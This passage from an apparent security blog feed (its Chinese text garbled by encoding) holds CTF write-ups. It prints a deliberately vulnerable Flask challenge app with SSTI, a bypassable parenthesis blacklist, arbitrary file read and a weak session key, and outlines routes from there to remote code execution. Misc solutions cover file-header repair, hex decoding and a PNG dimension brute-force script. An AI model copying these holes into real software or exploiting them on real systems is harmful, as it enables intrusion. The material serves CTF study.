class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string,redirect,render_template,session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ffffffff111llllag</span><br><span class="line"></span><br><span class="line">app = Flask(import_name=__name__,template_folder=<span class="string">&#x27;templates&#x27;</span>,static_folder=<span class="string">&#x27;static&#x27;</span>,static_url_path=<span class="string">&#x27;/static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/admin/&#x27;</span> <span class="keyword">in</span> request.path:</span><br><span class="line">        sess_name=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">            sess_name=session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> sess_name!=<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your current account is &#x27;</span>+sess_name+<span class="string">&#x27; not admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeheader</span>(<span class="params">response</span>):</span></span><br><span class="line">    response.headers[<span class="string">&quot;X-Powered-By&quot;</span>] = <span class="string">&quot;PHP/7.2.10&quot;</span></span><br><span class="line">    response.headers[<span class="string">&quot;Hint&quot;</span>] = <span class="string">&quot;Wake up Neo, the Matrix has you&quot;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Server&#x27;</span>]=<span class="string">&#x27;Apache/2.4.35 (Win64) PHP/7.2.10&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redirect_2_index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not in session!&#x27;</span>)</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;./index.php&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/err.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">err</span>():</span></span><br><span class="line">    <span class="comment">#I patched the SSTI vulnerability.How clever I am!</span></span><br><span class="line">    errorinfo=request.args.get(<span class="string">&quot;errorinfo&quot;</span>)</span><br><span class="line">    blacklist=[<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> errorinfo:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;Oh no,there is an Error! Error info:&lt;p&gt; %s&quot;</span> % errorinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login.php&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> username <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/backendmanage.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backendmanage</span>():</span></span><br><span class="line">    img=request.args.get(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img:</span><br><span class="line">        img=<span class="string">&#x27;1.png&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> img:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(img, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> img_f:</span><br><span class="line">        content = img_f.read()</span><br><span class="line">        content = base64.b64encode(content)</span><br><span class="line">    content=<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> content])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Current Image:&#123;img&#125;&lt;/h1&gt;&lt;!-- ?img=1.png --&gt;&lt;img  src=&quot;data:;base64,&#123;content&#125;&quot;&gt;&#x27;</span>.<span class="built_in">format</span>(img=img,content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params">Exception</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_exception_handler</span>(<span class="params">e</span>):</span></span><br><span class="line">    e=<span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/err.php?errorinfo=&quot;</span>+e, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯»å–flagæ–‡ä»¶åï¼Œæ‹¿åˆ°flagã€‚</p><p>image-20210511161628308.png<img src="http://cdn.polowong.top/1620813641263aqv49hf6.png?imageslim" alt="paste image"></p><p>è¿™é¢˜æœ‰å‡ ä¸ªå‘ç‚¹ï¼Œé¦–å…ˆæ˜¯HTTPå¤´é‡Œé¢çš„PHP HEADER å®¹æ˜“è¿·æƒ‘äººï¼Œå…¶æ¬¡æ˜¯ç™»å½•é‚£çš„sqlæ³¨å…¥å®¹æ˜“è¿·æƒ‘äººï¼Œæœ€åæ˜¯FLASK-SSTIçš„åˆ©ç”¨æ–¹å¼éœ€è¦æŒæ¡å…¨é¢ï¼š</p><p>1.ç›´æ¥RCE</p><p>2.å¼€DEBUGæ—¶ï¼ŒSSTI è¯»æ–‡ä»¶-&gt;æ„é€ PINç -&gt;RCE</p><p>3.ä¼ªé€ sessionç™»å½•</p><h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>æµé‡åŒ…æ²¡çœ‹å‡ºæ¥å•¥ï¼Œç›´æ¥åˆ†ç¦»httpå¯¹è±¡å‘ç°äº†flag.phpï¼Œå‹ç¼©åŒ…è¢«ç ´åäº†ï¼Œä¿®å¤ä¸‹å¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)ï¼Œ                        ã€€ã€€æ–‡ä»¶å¤´ï¼šFFD8FFã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼šFF D9ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</span><br><span class="line">PNG (png)ï¼Œ                       ã€€ã€€ æ–‡ä»¶å¤´ï¼š89504E47ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼šAE 42 60 82</span><br><span class="line">GIF (gif)ï¼Œ                           ã€€ã€€æ–‡ä»¶å¤´ï¼š47494638ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š00 3B                                                                 ZIP Archive (zip)ï¼Œ                     æ–‡ä»¶å¤´ï¼š504B0304ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š50 4B</span><br><span class="line"></span><br><span class="line">TIFF (tif)ï¼Œ                           ã€€  æ–‡ä»¶å¤´ï¼š49492A00ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š</span><br><span class="line">Windows Bitmap (bmp)ï¼Œ      ã€€  æ–‡ä»¶å¤´ï¼š424Dã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼š</span><br><span class="line">CAD (dwg)ï¼Œ                        ã€€  æ–‡ä»¶å¤´ï¼š41433130ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š</span><br><span class="line">Adobe Photoshop (psd)ï¼Œ          æ–‡ä»¶å¤´ï¼š38425053ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ–‡ä»¶å°¾ï¼š</span><br><span class="line">Rich Text Format (rtf)ï¼Œ             æ–‡ä»¶å¤´ï¼š7B5C727466ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€  æ–‡ä»¶å°¾ï¼š</span><br><span class="line">XML (xml)ï¼Œ                              æ–‡ä»¶å¤´ï¼š3C3F786D6Cã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ æ–‡ä»¶å°¾ï¼š</span><br><span class="line">HTML (html)ï¼Œ                           æ–‡ä»¶å¤´ï¼š68746D6C3E</span><br><span class="line">Email [thorough only] (eml)ï¼Œ     æ–‡ä»¶å¤´ï¼š44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)ï¼Œ            æ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)ï¼Œ                         æ–‡ä»¶å¤´ï¼š2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)ï¼Œ      æ–‡ä»¶å¤´ï¼šD0CF11E0</span><br><span class="line">MS Access (mdb)ï¼Œ                    æ–‡ä»¶å¤´ï¼š5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)ï¼Œ                  æ–‡ä»¶å¤´ï¼šFF575043</span><br><span class="line">Adobe Acrobat (pdf)ï¼Œ               æ–‡ä»¶å¤´ï¼š255044462D312E</span><br><span class="line">Quicken (qdf)ï¼Œ                         æ–‡ä»¶å¤´ï¼šAC9EBD8F</span><br><span class="line">Windows Password (pwl)ï¼Œ         æ–‡ä»¶å¤´ï¼šE3828596</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)ï¼Œ                    æ–‡ä»¶å¤´ï¼š52617221</span><br><span class="line">Wave (wav)ï¼Œ                            æ–‡ä»¶å¤´ï¼š57415645</span><br><span class="line">AVI (avi)ï¼Œ                                 æ–‡ä»¶å¤´ï¼š41564920</span><br><span class="line">Real Audio (ram)ï¼Œ                     æ–‡ä»¶å¤´ï¼š2E7261FD</span><br><span class="line">Real Media (rm)ï¼Œ                       æ–‡ä»¶å¤´ï¼š2E524D46</span><br><span class="line">MPEG (mpg)ï¼Œ                           æ–‡ä»¶å¤´ï¼š000001BA</span><br><span class="line">MPEG (mpg)ï¼Œ                           æ–‡ä»¶å¤´ï¼š000001B3</span><br><span class="line">Quicktime (mov)ï¼Œ                     æ–‡ä»¶å¤´ï¼š6D6F6F76</span><br><span class="line">Windows Media (asf)ï¼Œ               æ–‡ä»¶å¤´ï¼š3026B2758E66CF11</span><br><span class="line">MIDI (mid)ï¼Œ                              æ–‡ä»¶å¤´ï¼š4D546864</span><br></pre></td></tr></table></figure><p>image-20210512132636816.png<img src="http://cdn.polowong.top/1620813669182k7qlq11e.png?imageslim" alt="paste image"></p><p>æå–rar</p><p>image-20210512132807911.png<img src="http://cdn.polowong.top/16208136734786pvpwoic.png?imageslim" alt="paste image"></p><p>åå…­è¿›åˆ¶è½¬ascii</p><p>flag{My_Name_is_AoBai}</p><h1 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h1><p>zipæ–‡ä»¶å¤´ä¿®å¤</p><p>å¾—åˆ°å¯†æ–‡5a6e4665536e506248206579666b7b39733930733833742d393637312d3433626a2d616f69302d3235663176393138707030377d</p><p>åå…­è¿›åˆ¶è½¬ascii</p><p>ZnFeSnPbH<br>eyfk{9s90s83t-9671-43bj-aoi0-25f1v918pp07}</p><p>ç»´å‰å°¼äºšè§£å¯†ï¼ˆcaptfencoder1.xç‰ˆæœ¬ ç»´å‰å°¼äºšè§£å¯†æœ‰bugï¼‰</p><p>flag{9a90f83e-9671-43ac-bbd0-25b1d918ca07}</p><h1 id="misc-3"><a href="#misc-3" class="headerlink" title="misc 3"></a>misc 3</h1><p>å‹ç¼©åŒ…å¤´éƒ¨ä¿®å¤ï¼Œä¿®æ”¹é”™äº†çš„1ä½</p><p>ç„¶åéœ€è¦å¯†ç ï¼Œç›´æ¥binwalkåˆ†ç¦»å‡ºæ¥ä¸€ä¸ªLinuxå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ°è¿™é‡Œå¡ä½äº†ã€‚ã€‚ç„¶ååé¢çœ‹äº†çœ‹æ–‡ä»¶å¤´åº”è¯¥æ˜¯ä¸ªpngï¼ŒzhiweilaiåŠ ä¸Špngçš„ä¸ºæ–‡ä»¶å¤´åå‘ç°å›¾ç‰‡å®½é«˜æœ‰é—®é¢˜ï¼ŒLinuxæ‰“ä¸å¼€ï¼Œç”¨è„šæœ¬çˆ†ç ´å®½é«˜ä¿®æ”¹å³å¯ã€‚</p><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#ç†è®ºä¸Š0xffffffff,ä½†è€ƒè™‘åˆ°å±å¹•å®é™…/cpuï¼Œ0x0fffå°±å·®ä¸å¤šäº†</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):          <span class="comment">#é«˜å’Œå®½ä¸€èµ·çˆ†ç ´</span></span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))     <span class="comment">#qä¸º8å­—èŠ‚ï¼Œiä¸º4å­—èŠ‚ï¼Œhä¸º2å­—èŠ‚</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;å®½ä¸ºï¼š&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                width1=binascii.b2a_hex(width)</span><br><span class="line">                width1=width1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                width1=<span class="built_in">int</span>(width1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(width,width1)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;é«˜ä¸ºï¼š&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                height1=binascii.b2a_hex(height)</span><br><span class="line">                height1=height1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                height1=<span class="built_in">int</span>(height1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(height,height1)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>åœ¨å¯¹åº”çš„ä½ç½®ä¿®æ”¹å›¾ç‰‡å®½é«˜çš„åå…­è¿›åˆ¶å€¼å³å¯ã€‚</p><p>image-20210512175308222.png<img src="http://cdn.polowong.top/16208136581593aoz2hnd.png?imageslim" alt="paste image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h1&gt;&lt;p&gt;webshellä¸Šä¼ &lt;/p&gt;
&lt;p&gt;å‰ç«¯ç»•è¿‡ã€‚ç»•äº†åŠå¤©æ‰æƒ³èµ·æ¥æ˜¯å‰ç«¯ç»•è¿‡ã€‚ã€‚burpæ”¹ä¸ªåç¼€å°±å¥½äº†&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>å®ä¹ &amp;å­£åº¦æ€»ç»“</title>
    <link href="https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2021-04-23T07:17:00.000Z</published>
    <updated>2021-04-30T03:43:43.747Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ä»Šå¤©æ˜¯2021å¹´4æœˆ29æ—¥ï¼Œåˆšç»“æŸæŸå¸‚hwé¡¹ç›®ï¼Œåšå®Œè¿™ä¸ªé¡¹ç›®ï¼Œæˆ‘çš„å®ä¹ ç”Ÿæ´»åŸºæœ¬ç®—æ˜¯ç»“æŸäº†ã€‚è¿˜åœ¨é«˜é“ä¸Šï¼Œè¶ç€è¿™ä¸ªæ—¶é—´æ€»ç»“ä¸‹è¿™å››ä¸ªæœˆçš„å®ä¹ &amp;é¡¹ç›®ç”Ÿæ´»ã€‚</p></blockquote><h2 id="é‡‘å±±äº‘å®ä¹ "><a href="#é‡‘å±±äº‘å®ä¹ " class="headerlink" title="é‡‘å±±äº‘å®ä¹ "></a>é‡‘å±±äº‘å®ä¹ </h2><p>ä»Šå¹´ä¸€æœˆä»½ï¼Œå¼€å§‹äº†åœ¨é‡‘å±±äº‘å®ä¹ çš„æ—¥å­ï¼Œæ€»è®¡çº¦ä¸‰ä¸ªæœˆï¼Œå…¶å®å¹²æ´»çš„æ—¶é—´ä¹Ÿå°±å››åæ¥å¤©ï¼Œä¸­é—´ç®—ä¸Šè¿‡å¹´ã€è¯·å‡ä»€ä¹ˆçš„ï¼Œæ‰€ä»¥æ—¥å­å°±æ¯”è¾ƒå°‘äº†ã€‚å’ŒåŒäº‹ä»¬çš„ç›¸å¤„å¾ˆæ„‰å¿«ï¼Œé¢†å¯¼æ˜¯ææŠ€æœ¯çš„ï¼Œç›¸å¤„èµ·æ¥éå¸¸èˆ’æœã€‚åœ¨é‡‘å±±çš„è¿™æ®µæ—¶é—´è¿˜ç®—æ˜¯æ¯”è¾ƒå¿«ä¹çš„ï¼Œè™½ç„¶ç´¯äº†ä¸€ç‚¹ï¼Œä½†æ˜¯æ”¶è·ç›¸å¯¹è¿˜ä¸é”™ã€‚åœ¨é‡‘å±±ï¼Œé¦–å…ˆæ˜¯åœ¨åšé¡¹ç›®çš„è¿‡ç¨‹ä¸­å­¦åˆ°äº†ä¸€äº›çŸ¥è¯†ï¼Œæ¸—é€çš„æ€è·¯ã€æµ‹è¯•æ–¹æ³•å•¥çš„ï¼Œæˆ‘è§‰å¾—è¿™äº›æ¯”è¾ƒé‡è¦ï¼Œå…¶æ¬¡æ˜¯åœ¨å…¬å¸é’“é±¼çš„é¡¹ç›®ä¸­å­¦åˆ°äº†çº¢é˜ŸçŸ¥è¯†ï¼Œå¹¶ä¸”å¼€å¯äº†æˆ‘å¯¹çº¢é˜Ÿå‘å¾€çš„å¤§é—¨ã€‚<br>åœ¨å…¬å¸ï¼Œæˆ‘å­¦åˆ°äº†ä¸€äº›ç®€å•çš„å…æ€æŠ€å·§ï¼Œå¹¶ä¸”è¿˜ä¼šç»§ç»­é’»ç ”ï¼›æ¥è§¦åˆ°äº†é’“é±¼é‚®ä»¶ä¼ªé€ ï¼Œç›®å‰è¿˜åœ¨å­¦ä¹ ï¼›Badusbä¸Šçº¿CSé©¬ï¼Œè¿™ä¸ªå·²ç»å®ç°äº†ã€‚è¿˜æœ‰å°±æ˜¯åŸºæœ¬çš„åº”æ€¥å“åº”æŠ€èƒ½ï¼Œåœ¨å…¬å¸æˆ‘ç‹¬ç«‹å¤„ç†äº†ä¸€èµ·åº”æ€¥å“åº”äº‹ä»¶ï¼Œæˆ‘è§‰å¾—çœŸçš„æ˜¯å¾ˆæ£’çš„å®è·µæœºä¼šã€‚æœ€åæ˜¯ç¤¾äº¤æ–¹é¢ï¼Œè®¤è¯†äº†ä¸€äº›æœ‹å‹ã€‚å…¶ä»–è™šæ— ç¼¥ç¼ˆçš„ä¸è¯´äº†ï¼Œåªè¯´äº›å®é™…çš„ã€‚</p><h2 id="hwè“é˜Ÿ"><a href="#hwè“é˜Ÿ" class="headerlink" title="hwè“é˜Ÿ"></a>hwè“é˜Ÿ</h2><p>ä»Šå¹´hwå»äº†é’è—¤ï¼Œæœ¬æ¥ç­¾äº†æ·±è“ï¼Œæ·±è“çš„è´Ÿè´£äººå¯¹æˆ‘ä¹Ÿå¾ˆå¥½ï¼Œä½†æ˜¯åé¢å‡ºäº†ç‚¹äº‹æƒ…ï¼Œæ‰€ä»¥æˆ‘å°±ç»™é¸½äº†â€¦ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ„Ÿè°¢ç¡•å“¥ç»™æˆ‘æœºä¼šï¼Œå¼Ÿå¼Ÿé“­è®°åœ¨å¿ƒã€‚è¯´å®åœ¨çš„ï¼Œhwæˆ‘æ˜¯å¤œç­ï¼Œä¸»è¦æ˜¯çœ‹HIDSè®¾å¤‡å‘Šè­¦ï¼Œè¢«åœ°æ–¹çš„ç»™æçƒ¦äº†ï¼Œç»å¸¸æœ‰è¯¯æŠ¥ï¼Œç™½å¤©çš„åŒæ—¶ä¹Ÿå¾ˆè¾›è‹¦ï¼Œæˆ‘è§‰å¾—æˆ‘å¤œç­è¿˜æ˜¯éå¸¸å¹¸è¿çš„ï¼Œå°±æ˜¯èº«ä½“ä¸Šç´¯äº†ç‚¹ã€‚æˆ‘è§‰å¾— é€šè¿‡è¿™æ¬¡hw è®¤è¯†æœ‹å‹æ¯”è¾ƒé‡è¦å§ï¼Œå…¶æ¬¡å°±æ˜¯çœŸçœŸæ­£æ­£åœ°æ¥è§¦äº†ä¸€ä¸‹è¿™ç§å¤§å‹çš„å®‰å…¨é¡¹ç›®ï¼Œä¹‹å‰å¹¶æ²¡æœ‰æ¥è§¦è¿‡ã€‚è¿˜æœ‰å°±æ˜¯åœ¨hwæ—¶çš„ä¸€äº›å¤„ç†äº‹æƒ…çš„æ–¹æ³•ï¼Œæ¯”å¦‚å¤„ç½®æµç¨‹ã€æƒé™ä¸èŒè´£ã€‚ä¹‹ç±»çš„ä¹‹å‰ä¹Ÿåªæ˜¯é™äºç†è®ºï¼Œä¹Ÿæ›´åŠ äº†è§£äº†æˆ‘æƒ³è±¡ä¸­çš„hwå’ŒçœŸå®çš„hwçš„åŒºåˆ«2333.</p><h2 id="hwçº¢é˜Ÿ"><a href="#hwçº¢é˜Ÿ" class="headerlink" 